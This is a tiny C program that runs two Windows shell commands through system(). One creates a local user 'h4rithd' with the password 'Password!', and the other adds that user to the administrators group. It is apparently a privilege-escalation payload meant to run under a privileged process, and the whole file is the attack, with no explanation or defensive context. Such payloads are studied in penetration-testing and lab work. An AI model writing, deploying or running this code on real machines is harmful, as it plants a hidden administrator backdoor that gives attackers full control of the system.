#include <stdlib.h>

int main ()
{
    int user;
    user = system ("net user h4rithd Password! /add");
    user = system ("net localgroup administrators h4rithd /add");
    return 0;
}
